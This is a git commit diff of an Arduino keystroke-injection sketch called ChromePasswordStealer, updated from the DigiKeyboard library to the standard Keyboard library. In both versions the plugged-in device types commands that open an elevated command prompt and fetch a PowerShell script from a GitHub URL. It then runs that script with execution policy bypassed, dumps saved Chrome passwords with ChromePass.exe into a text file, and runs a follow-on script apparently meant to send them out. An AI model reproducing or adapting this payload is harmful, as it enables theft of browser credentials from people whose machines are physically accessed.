3aef47c5cb2f1114605b0ebf4f958933a5661265
abdulaziesmuslim <abdulazies55@gmail.com>
2020-05-27 17:38:06 +0700

    Update ChromePasswordStealer.ino

--- ChromePasswordStealer/ChromePasswordStealer.ino
+++ ChromePasswordStealer/ChromePasswordStealer.ino
@@ -1,46 +1,55 @@
-#include "DigiKeyboard.h"
-/* Init function */
-void setup()
-{
-  pinMode(1, OUTPUT); //LED on Model A
-  digitalWrite(1, HIGH);
-  DigiKeyboard.delay(100);
-  digitalWrite(1, LOW);
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("powershell Start-Process cmd -Verb RunAs");
-  DigiKeyboard.delay(200);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("cd / & mkdir chrome & cd chrome");
-  DigiKeyboard.delay(50);
-  DigiKeyboard.println("echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
-  DigiKeyboard.delay(200);
-  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
-  DigiKeyboard.delay(20);  
-  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File ChromeUpdateDownload.ps1");
-  DigiKeyboard.delay(50);
-  DigiKeyboard.println("ChromePass.exe /stext maintenance.txt");
-  DigiKeyboard.delay(50);
-  DigiKeyboard.println("powershell ./maintenance.ps1");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(50);
-  /*DigiKeyboard.println("cd C:/");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(50);
-  DigiKeyboard.println("rmdir /s /q chrome");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(50);
-  DigiKeyboard.println("exit");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(50);*/
-  digitalWrite(1, HIGH);
+#include "Keyboard.h"
+
+void typeKey(int key) {
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup() {
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(400);
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start-Process cmd -Verb runAs");
+  typeKey(KEY_RETURN);
+  delay(1000);
+  Keyboard.press(KEY_LEFT_ARROW);
+  delay(1000);
+  typeKey(KEY_RETURN);
+  delay(1000);
+  Keyboard.print("cd / & mkdir chrome & cd chrome");
+  typeKey(KEY_RETURN);
+  delay(100);
+  Keyboard.print("echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
+  typeKey(KEY_RETURN);
+  delay(100);
+  Keyboard.print("powershell -ExecutionPolicy ByPass -File b.ps1");
+  typeKey(KEY_RETURN);
+  delay(100);
+  Keyboard.print("powershell -ExecutionPolicy ByPass -File ChromeUpdateDownload.ps1");
+  typeKey(KEY_RETURN);
+  delay(100);
+  Keyboard.print("ChromePass.exe /stext maintenance.txt");
+  typeKey(KEY_RETURN);
+  delay(100);
+  Keyboard.print("powershell ./maintenance.ps1");
+  typeKey(KEY_RETURN);
+  delay(100);
+  
+  /*typeKey(KEY_RETURN);
+  Keyboard.print("exit");
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();*/
 }
 
 /* Unused endless loop */
-void loop() {}  
+void loop() {}
